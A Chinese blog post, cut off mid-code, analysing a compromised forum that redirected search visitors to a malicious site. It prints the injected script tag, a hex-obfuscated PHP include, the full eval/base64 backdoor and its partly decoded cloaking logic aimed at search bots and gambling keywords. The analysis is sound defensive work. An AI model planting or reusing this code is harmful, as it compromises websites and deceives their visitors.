<li>在代码和数据库dump结果中搜索恶意站点信息，一无所获
</li>

<li>然后怀疑是用户上传的图片中挂了马，特别是联想到首页最近刚上热图轮播，安装 <code>firefox</code> 插件 <code>ImageBlock</code> 让浏览器不加载图片，可是问题依旧
</li>

<li>打开 <code>firebug</code> 的 <code>Network</code> 标签，在页面加载记录中发现一个异常的js加载： <code>http://api.discuz.com.de/Seo.js</code> 

<p>
在代码和数据库中搜索这个js找不到任何信息。
</p>

<ul class="org-ul">
<li>将恶意站点配置一条 <code>hosts</code> 

<pre class="example">
127.0.0.1 api.discuz.com.de
</pre>
</li>
</ul>
<p>
浏览器不再自动跳转到恶意网站了。 
</p>
</li>

<li>从 <code>google</code> 跳转到论坛后，查看页面源代码在最开始部分发现了引入恶意js的语句

<div class="org-src-container">

<pre class="src src-html">&lt;<span style="color: #de935f;">div</span> <span style="color: #f0c674;">style</span>='display:none'&gt;&lt;<span style="color: #de935f;">script</span> <span style="color: #f0c674;">language</span>='javascript' <span style="color: #f0c674;">src</span>='http://count31.51yes.com/click.aspx?id=310940343<span style="color: #f0c674;">&amp;logo</span>=1' <span style="color: #f0c674;">charset</span>='gb2312'&gt;&lt;/<span style="color: #de935f;">script</span>&gt;&lt;/<span style="color: #de935f;">div</span>&gt;&lt;<span style="color: #de935f;">script</span> <span style="color: #f0c674;">type</span>='text/javascript' <span style="color: #f0c674;">src</span>='http://api.discuz.com.de/Seo.js'&gt;&lt;/<span style="color: #de935f;">script</span>&gt;
</pre>
</div>
</li>

<li>在php脚本中加入 <code>echo</code> 语句逐步缩小范围，最终发现问题由下面一条语句引起

<div class="org-src-container">

<pre class="src src-php"><span style="color: #b5bd68;">INCLUDE</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">pack(</span><span style="color: #8abeb7;">'H*'</span>,<span style="color: #8abeb7;">'2f7661722f746d702f2e53595344554d502f2e576830416d492e434f5245'</span><span style="text-decoration: underline;">));</span>
</pre>
</div>

<p>
上面的语句引入了 <code>/var/tmp/.SYSDUMP/.Wh0AmI.CORE</code> 脚本。
</p>

<p>
删除该语句后问题解决。
</p>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">分析恶意代码</h2>
<div class="outline-text-2" id="text-3">
<ul class="org-ul">
<li><code>/var/tmp/.SYSDUMP/.Wh0AmI.CORE</code>

<div class="org-src-container">

<pre class="src src-php"><span style="color: #b294bb;">&lt;?php</span> $<span style="color: #f0c674;">O00OO0</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">urldecode(</span><span style="color: #8abeb7;">"%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2</span><span style="color: #8abeb7; text-decoration: underline;">A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A"</span><span style="text-decoration: underline;">);$</span><span style="color: #f0c674; text-decoration: underline;">O00O0O</span><span style="text-decoration: underline;">=$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">3</span><span style="text-decoration: underline;">}.$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">6</span><span style="text-decoration: underline;">}.$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">33</span><span style="text-decoration: underline;">}.$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">30</span><span style="text-decoration: underline;">};$</span><span style="color: #f0c674; text-decoration: underline;">O0OO00</span><span style="text-decoration: underline;">=$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">33</span><span style="text-decoration: underline;">}.$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">10</span><span style="text-decoration: underline;">}.$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">24</span><span style="text-decoration: underline;">}.$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">10</span><span style="text-decoration: underline;">}.$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">24</span><span style="text-decoration: underline;">};$</span><span style="color: #f0c674; text-decoration: underline;">OO0O00</span><span style="text-decoration: underline;">=$</span><span style="color: #f0c674; text-decoration: underline;">O0OO00</span><span style="text-decoration: underline;">{</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">0</span><span style="text-decoration: underline;">}.$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">18</span><span style="text-decoration: underline;">}.$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">3</span><span style="text-decoration: underline;">}.$</span><span style="color: #f0c674; text-decoration: underline;">O0OO00</span><span style="text-decoration: underline;">{</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">0</span><span style="text-decoration: underline;">}.$</span><span style="color: #f0c674; text-decoration: underline;">O0OO00</span><span style="text-decoration: underline;">{</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">1</span><span style="text-decoration: underline;">}.$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">24</span><span style="text-decoration: underline;">};$</span><span style="color: #f0c674; text-decoration: underline;">OO0000</span><span style="text-decoration: underline;">=$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">7</span><span style="text-decoration: underline;">}.$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">13</span><span style="text-decoration: underline;">};$</span><span style="color: #f0c674; text-decoration: underline;">O00O0O</span><span style="text-decoration: underline;">.=$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">22</span><span style="text-decoration: underline;">}.$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">36</span><span style="text-decoration: underline;">}.$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">29</span><span style="text-decoration: underline;">}.$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">26</span><span style="text-decoration: underline;">}.$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">30</span><span style="text-decoration: underline;">}.$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">32</span><span style="text-decoration: underline;">}.$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">35</span><span style="text-decoration: underline;">}.$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">26</span><span style="text-decoration: underline;">}.$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">30</span><span style="text-decoration: underline;">};</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">eval(</span><span style="text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00O0O</span><span style="text-decoration: underline;">(</span><span style="color: #8abeb7; text-decoration: underline;">"JE8wTzAwMD0idVJKalF2d2xZRHBIS29Vc2tBZG1pQlphTkdxeEZoQ1hUZ09MY1Z0RVd5Yk1Jcm56UGVTZklUak95VnFVZmdDZWx1SndkQldzUXpTbnRLeExrUEVtRnBYTWJhaFJ2SGlBR1lyY05vWkROZzlxbmVCdEVROHhneXV4Zm1hMG5LOUhYcld1aTJraG55MGxsUUJwSmFScEdndTBYZ2RIQWdKM2d5dXhNcTBsU21qSGkzakRic2FxaTNqMG52NXJsZ0JDWHEwbGpLU0NpS2FSbm1HcE5aQnJNM1NQYlE5MGltQlZNVXRTSjBUYUZhQlZqY3d0RVFUakpnMGRtMXRrSlVTa0pVd3JKZGF0RjFUa20wa1JUa0dybUZ3dEVRVEVpM3k5ams5RlRhanZUYWppajBQSmFrekRhYXRrSlU5elQwYVhhRVdXWHEwbGpralVTTzBkbTF0a0pVU2tKVXdyWmtUSkprOVpUSlNrSmRhWmoxMDdneXVkWjBVeU52a0hic2s1bEViTEFGYklBT3BJQU9KMU1PQTNqSHFyQUZSMk1PSjFNT0cwQVo0SHRFYndqY1JIdFo0MnRFNDV0RTRIQUZkck1FYkxBRmRJQUZ5M01PUkx0RTRIQUZBck1FYkxBRnBJQUZHSE1PUjRYRTRMWEZ5ck1FYjJBRTRMdGNHSUFPRzVNT2ZMakhxcnRPUklBRnA0TU9BNU1PUjJqSHFydE9SSUFGeTNNT2Q0TU9SNVhFYndqY2ZMTU9SSFhaNDB0WjQzQVFid2pjUkxBSDQ1WEU0SHRGeUlBT3kxakhxcnRGcElBT0dMTU9mTE1PUkhYRWJ3amNSTHRINGN0RTQzQUg0M0FFYndqY0o0TU9HTHRaNExYRkJJWGd5ck1FYkxBRmJJQU9wSUFPSjFNT0pjakhxckFGcGNNT2RMTU95cU1PUjB0RWJ3amNSTHRINEhBWjRIQU9CSUFPeTFqSHFyQUZHSE1PR0hYRTRIQWdCSXRnZnJNRWIyQVo0THRPeUlBRkpxTU9icWpIcXJ0T1JJQUZ5M01PUnFYRTQwQVpid2pjUkx0UTQxdFo0SHRnR0lBRkE0akhxckFGUjBNT3BxTU9HSEFRNEh0Z0dyTUViMkFaNEx0Z2JJQUZCNE1PeUxqSHFyQUZSMk1PRzF0WjRIQWNCSXRjQnJNRWJIQU9HSUFGcDJNT0cwTU9HMmpIcXJBT0dITU9SNHRRNEh0RTQxWFpid2pjR0hBRTRMWGdSSUFGSjRNT1JxdFFid2pjUkhBSDRMQU9KSUFGZnFNT0dMdFpiQ1hxMGxqUmhFaTN5OWZtakhmbWR1ajBqUG52VDFiM3pDU0thSGpIcXJUMjlWUzJMVWZzOTBqSHFydnZrdWkyOHJNRVdFbnY1cmZzOTBqSHFySjI5Y2kzdHFudlRVYlFid2oxdFZTMjkxakhxckFjZnFKM3pDU0thSGpIcXJ2djkxU0trVnlzOTBqSGQ3Z3l1ZFoyYTVOdmtIYnNrNWxFV1BpcmsxZnY0SWkzanJqSHFyUzI5VlMyTFVNc3RWaVpid2ozdFZiMjhJZjI5aGpIcXJqdko0anZHMWpGUE9qSHFyanZKNWp2a1Bqdkdxakhxcmp2SjVqdkdManZqT2pIcXJqdkozakZwNWpGVVFqSHFyanZKMWpGUGRqRlVQanZKMWp2amRqdlI1akhxcmp2SjNqRmQ1anZqVWp2SjFqdmtVanZHMmpIcXJqdkoyanZSY2pGUFFqdkozakZwNWpGUE9qSHFyanZKMmp2RzRqdkc0anZKMmpGcDRqRlBzakhxcmp2SjFqdlI0anZHTGp2SjBqdkc1akZkcWpIcXJqdkoxakZVUWp2amRqdko1akZkNWpGcDFqSHFyanZKM2pGVU9qRlVzanZKMGp2alBqdmpQakhxcmp2SjNqRlVPakZVc2p2SjVqRmRIanZHTGpIcXJqdkozakZQVWp2R3Fqdko1akZwM2pGZExqSHFyanZKMmp2R2NqdlI0anZKMWpGcDJqRlBPakhxcmp2SjFqdmpPakZwcWp2SjJqRnA0anZHM2pIcXJqdkoxanZqZGp2UjVqdko1akZwM2pGZExqSHFyanZKNGp2RzFqRlVQanZKNWpGZEhqdkdMakhxcmp2SjJqRlBzakZkcWp2SjNqRlBVanZHcWpIcXJqdkozanZrZGpGZDJqdkozakZkMWp2UjFqSHFyanZKNGp2a3NqRmQxanZKM2pGUFVqdlI1akhxcmp2SjFqdkc1anZHY2p2SjFqRlBzanZHcWpIcXJqdkoxanZSMGp2a1Bqdko1akZkNGp2R2NqdkoxakZVc2pGUFVqSHFyanZKMGp2amRqRmRjanZKNWp2a1BqRlBPanZKNWpGcDNqRmRMakhkN2d5Q3NXdjVPV0tVVmlRemRTdkFxU0tKdWpLU0NpS2FSbm1Hd2pLVFBXS1JDb3EwbGpLVFBXS2t6YnJHcE5aelVvZXp3aTJUVWxFYjZqSHFkU0trMGZaZDdneXVqalJoVW9tQXBOWnpVb2V6d2kyVFVsRWI2akhMUWZtdFV0T1REU0thT2kyVFVsZXQwYlU5SGkzeUxBSFBxZnZ0WWxFV0dsUWJ3aktUUFdLa3picmppQWswQ2xaZENYcTBsRVpUWFNtV2NHZzBwU21QcWlLOWRTWnByWFFid2Zza2NTRmYwbTJUVWYyOWRTWlBjV2VqRGJzOTBBRkF1YktrT25IcHJaRXVyTUVUZGZtVFB5bWpIdmNrV2xaZENsRnd0RXBkZEZLVUluM0E5R0thNGJLTFZTS0p1amN1ck1LalBiMkoydGs5ZFN2dFZTS0p1YjNUSG0zalZXZ1JjbGV6UGYyd3VqMHB4akhxZFNLazBmSmtIYlV3SG1aZENsWmQ3Z3l1anlLVUlmMkwxU0tKdWpLU0NpS2FSbm1HSWpINW1uZ3p6aUpkSUZKOVJUSnFybEZoZG52SjdneUM5Z3lDc1d2NU9XS1VWaVF6clNtVGRmbVRQbEVUZGZtVFBtM2FIaUVVN2d5Q0NTUUJ1U3JhSWYzVENpMjVEU21QQ2IzVGNsRVdPV21qd20yYTRTdkFybFpkcG9xMGxqZXRxbTJ0MWJzcXBOWnpCZjNhSGlrOUNpc1UwbEVkN2d5Q09XbWp3bTN0VVdLOXFXRXBkYjN6RGYzYUhpRXFweTFhWkZSOXlhazlhSmRxd0dFVGRmbVRQbTNhSGlFZDdneUNPV21qd20zdFVXSzlxV0VwZGIzekRmM2FIaUVxcHkxYVpGUjl5YWs5R1RKa1JUYUd3R2dCQ1hxMGxmM2FIaWs5Y1NtVFZiZXl1amV0cW0ydDFic3F3R1J0YUpkTE5Ka1REeTA5WEZkYWdha1RqRkphTmFheXdHZ0pDWHEwbGYzYUhpazljU21UVmJleXVqZXRxbTJ0MWJzcXdHUnRhSmRMTkprVERKZGFKYWFqWGFranpGVXRLVGFHd0dnUkNYcTBsakt0VmlyVFVpclRjR2cwcHlLdDFic0xEU21QVWZIcGRiM3pEZjNhSGlFZDdneUNCZjNhSGlrOU9pSzljU1pwZGIzekRmM2FIaUVkN2d5QzlTdkxjU3ZVc2xLUzFpc3QwbnY5SW0yYTRubXQwYkhwcmIzVEhTdmtobTJ0VmlyVFVvZVREZjNqVWZtVFVqSGRDR2V3dEVRVGNiazlPaTI1MEdnMHBmbWpIZm1kdWoyUDBXZUJyR2cwK0dLa0hic2s1bEVXaFNtVHVpMnlyR2cwK0dFV2VUYXlyTUVXMG52MVVpM2EwakhCOU5RQjFsWmQ3Z3l1ZGIzekRiM1RIU1pCOUdSemNXZWpVZnYxRGYyOUlXS2E0V2s5T2JzYVBXS0p1amV0cW0ydFZpcnlDWHEwbGpLdFZpclRVaXJUY0dnMHB5S1NDaUthRFMyYTBtMnRWaXJUVWlyVGNsRVRkZm1UUG0zYUhpRXFwU3Nrd2IySndHRVRjYms5Y1dlalVsRnd0RXIxVWlldFVvcTBsaktQUGlzVHdTWkI5R1J6c2kzelVpUXBkU0trMGZhOTFic3F3R0VqSGZRR0NYSEJ0RVFUT2kyNTBTdjUwYkhCOUdSemNXZWpVZnYxRFMyYTBtMnRWaXJUVWlyVGNsRVR1ZnY1ZGlLSkNYSEJ0RWR6c2YyTFZiMkp1aktQUGlzVHdTWmQ3Z3lDOWd5Q0hTbVQxYnM0cGpLdFZpclRVaXJUY1hxMGxEeTBsU3JhSWYzVENpMjRwYjJQVldIcGRTc1V3U0pUQ2JRVTdneXVkU3NVd1N2NVBpdko5aktTQ2lLYVJubUdJaXZ5MWxFVERKMGFaYWRhWnZIV0dha1R5bTBQTkoxeXJtWjRkbTF0a0pVU2tKVXdySmRhVGFKYUZhazlhSmRkcm1aZDdneUNDU1FQQ2IxOXNudkxVbEVUc252TFVpc2toU1pkQ29xMGxFWlRzYmcxQlNzOXFTdjR1aktTQ2lLYUlmdjFVTUVXSGpIZDdneXVqaktUUFdLUjl5S1NIU3ZrZGxFVHNiRUxzbnZMVWIyVTZTWnBkU3NVd1N2NVBpdkpDbEZ3dEVwVUJTc3R3aTN0VWxFVHNiRWQ3Z3l1am52ZnVTdjFxV2VkdWpLVFBXS1JDbFp6N3llYUlpS1VJbkhwZFNzVXdTdjVQaXZKQ1gzalVXZWFIaU9oOWd5dWpTS2FPQUtUVWxFVHNudkxVVEtVSE1FVGRmbVRQbEZ3dEVyMHBTdkxjU1p6N2d5dWpqS1RQV0tSOVMyYTBTS2swZlpwcm5lVDBiZ3VWTTJqVVdFNWRubXRPV211SWYyOWhNc1RVTTNicWIyUENGMjgzTXJ6dWJnOUdGMXRKTlpiSWprOUZUYWp2VGFqaWowUEpha3pEWlI5RmFFV1dsRnd0RXBkZFNyQjl5S1NWYkthSWxFVHNudkxVaXNraFNacXJXSGJDWHEwbEVKenNXM2pDV0tKdWpLU3FNRVRkZm1UUGxGd3RFcFVCU3N0d2kzdFVsRVRzYkVkN2d5dWpudmZ1YjNUSGlLYUlsRVRkZm1UUGxaQitHZ1JxQWdCQ0dld3RFcFVkU3ZBcVNLSnVqS1NDaUthUm5tR3dqS1RQV0tSQ1hxMGxFbTB0RXIxOWd5Q0NTUXBQbnY1RGZtakhmbWR1alJVeU1FVE1aYUJDbG13dEVzU1Zic2FQZjJwdWpSaEVpM3lwZm1BcGpSaEVpM1RjbG1oQ1NRUGNXZWpDYjNUSGxFVEVpM3l3alJoRWkzVGNsWlU3Z3lDY25LOTNsRVRzbnZMVVRLVUhsRnd0RXIxOVNzOUhTdmtPbkVwZFoyYTVHS2tjR0VUTVNtVWNsbXd0RXNVc2xldDBic1VjV2VHdWpralVTUXFkWjJhNWJIZENvcTBsU3Z0dWlIQlFOS1RDV1F6Y1dlVXdTRjByU0tVY2JLTFBvRkNJaTI1VWpjNDhiMnRIbm16MEdLTFBpc1cxZnZXVU5aV3hmbVNQYjJ0SG5tejBqSHpjYnNBOWoyUDBXZUI2TUg5T2kzYUlXZ0FMTU9KTG92YWNNc3RWaVo5T2lLVU9uSDVQYjN6NE4yVWRORkFMQWdkMEFnQTBBSFN3aTJXVk5GUnJHS3R1Zm1qY1NteTlqMldRQU9BTEFRYitORTljZjNqQ2JleStORTlkbm1mK05ldE9ic1VxV0V6MG9telVOWlcwU21QME0yQ1BXc2tjZjNqQ2JleXJHZXRIZmMwcm5lVDBiZ3VWTTJrcW5aNWRubXRPV211SWYyOWhNc1RVTTF0VWlINXhiSGIrTkU5Y2YzakNiZXkrR09oOURtMHRFcD09IjtldmFsKCc/PicuJE8wME8wTygkTzBPTzAwKCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwKjIpLCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwLCRPTzAwMDApLCRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw=="</span><span style="text-decoration: underline;">));</span><span style="color: #b294bb; text-decoration: underline;">?&gt;</span>
</pre>
</div>
</li>

<li>参考 <a href="http://blog.i1728.com/post/99.html">网上方法</a> 解码的结果

<div class="org-src-container">

<pre class="src src-php"><span style="color: #b294bb;">&lt;?php</span>
<span style="color: #969896; font-style: italic;">/*</span>
<span style="color: #969896; font-style: italic;">*author:whoami</span>
<span style="color: #969896; font-style: italic;">*  QQ  :4892057</span>
<span style="color: #969896; font-style: italic;">*/</span>
<span style="color: #c5c8c6; background-color: #1d1f21;">error_reporting(0</span>);
$<span style="color: #f0c674;">fileDir</span> = <span style="color: #8abeb7;">'/var/tmp/.SYSDUMP/'</span>;
$<span style="color: #f0c674;">IP</span>=$<span style="color: #81a2be;">_SERVER</span>[<span style="color: #8abeb7;">'REMOTE_ADDR'</span>];
$<span style="color: #f0c674;">Bot</span>=$<span style="color: #81a2be;">_SERVER</span>[<span style="color: #8abeb7;">'HTTP_USER_AGENT'</span>];
$<span style="color: #f0c674;">Ref</span>=$<span style="color: #81a2be;">_SERVER</span>[<span style="color: #8abeb7;">'HTTP_REFERER'</span>];
$<span style="color: #f0c674;">KIP</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">'117.28.255.37'</span>,<span style="color: #8abeb7;">'116.55.241.24'</span>,<span style="color: #8abeb7;">'125.64.94.219'</span>,<span style="color: #8abeb7;">'119.147.114.213'</span>,<span style="color: #8abeb7;">'11</span><span style="color: #8abeb7; text-decoration: underline;">8.122.188.194'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'60.172.229.61'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'61.188.39.16'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'61.147.98.198'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'61.129.45.72'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'113.98.254.245'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'58.221.61.128'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'117.34.73.70'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'58.215.190.84'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'117.28.255.53'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'183.91.40.144'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'117.21.220.245'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'122.228.200.46'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'61.164.150.70'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'61.147.108.41'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'116.55.242.138'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'114.80.222.242'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'61.147.108.41'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'116.255.230.70'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'222.186.24.26'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'222.186.24.59'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'220.181.158.106'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'123.125.160.215'</span><span style="text-decoration: underline;">);</span>
$<span style="color: #f0c674;">KBot</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">'Baiduspider'</span>,<span style="color: #8abeb7;">'Googlebot'</span>,<span style="color: #8abeb7;">'Yahoo'</span>,<span style="color: #8abeb7;">'Bingbot'</span>,<span style="color: #8abeb7;">'Sosospider'</span>,<span style="color: #8abeb7;">'Sogou'</span>,<span style="color: #8abeb7;">'36</span><span style="color: #8abeb7; text-decoration: underline;">0Spider'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'YoudaoBot'</span><span style="text-decoration: underline;">);</span>
$<span style="color: #f0c674;">Key</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">'anquan.org'</span>,<span style="color: #8abeb7;">'google.com'</span>,<span style="color: #8abeb7;">'soso.com'</span>,<span style="color: #8abeb7;">'%e8%b5%8c'</span>,<span style="color: #8abeb7;">'%e9%aa%b0'</span>,<span style="color: #8abeb7;">'%e9%b1%</span><span style="color: #8abeb7; text-decoration: underline;">bc'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e7%89%9b'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e5%8d%9a%e5%bd%a9'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e7%99%be%e5%ae%b6'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e6%a3%8b%e7%89%8c'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e6%b8%b8%e6%88%8f'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e5%a8%b1%e4%b9%90'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e5%9b%bd%e9%99%85'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e7%9c%9f%e4%ba%ba'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e7%9c%9f%e9%92%b1'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e7%8e%b0%e9%87%91'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e6%b3%a8%e5%86%8c'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e5%bc%80%e6%88%b7'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e5%bd%a9%e9%87%91'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e8%b5%9a%e9%92%b1'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e6%8f%90%e7%8e%b0'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e7%ad%96%e7%95%a5'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e8%af%95%e7%8e%a9'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e5%b9%b3%e5%8f%b0'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e5%a4%aa%e9%98%b3%e5%9f%8e'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e4%bd%93%e9%aa%8c%e9%87%91'</span><span style="text-decoration: underline;">);</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">dec0de</span>($<span style="color: #f0c674;">fileDir</span>,$<span style="color: #f0c674;">data</span>){
$<span style="color: #f0c674;">dataArr</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">explode(</span><span style="color: #8abeb7;">':'</span>,$<span style="color: #f0c674;">data</span>);
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">Keys</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">explode(</span><span style="color: #8abeb7;">':'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">base64_decode(str_rot13(pack(</span><span style="color: #8abeb7;">'H*'</span>,$<span style="color: #f0c674;">dataArr</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">0</span>]))));
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">News</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">explode(</span><span style="color: #8abeb7;">':'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">base64_decode(str_rot13(pack(</span><span style="color: #8abeb7;">'H*'</span>,$<span style="color: #f0c674;">dataArr</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">1</span>]))));
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">Links</span>= <span style="color: #c5c8c6; background-color: #1d1f21;">explode(</span><span style="color: #8abeb7;">':'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">base64_decode(str_rot13(pack(</span><span style="color: #8abeb7;">'H*'</span>,$<span style="color: #f0c674;">dataArr</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">2</span>]))));
<span style="background-color: #373b41;"> </span>   @<span style="color: #b5bd68;">include</span>($<span style="color: #f0c674;">fileDir</span>.<span style="color: #8abeb7;">'.Wh0AmI.MODEL'</span>);<span style="color: #cc6666; font-weight: bold;">die</span>;
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">getdata</span>($<span style="color: #f0c674;">data_url</span>){
